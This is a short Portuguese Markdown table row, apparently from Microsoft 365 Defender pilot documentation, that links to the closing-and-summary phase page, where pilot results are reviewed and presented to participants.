|![Fase de fechamento e resumo](../../media/mtp/close.png) <br>[Fase de fechamento e resumo](m365d-pilot-close.md)|Analise o resultado piloto do Microsoft 365 Defender, apresente-os aos participantes e dê a próxima etapa.
|:-----|:-----|
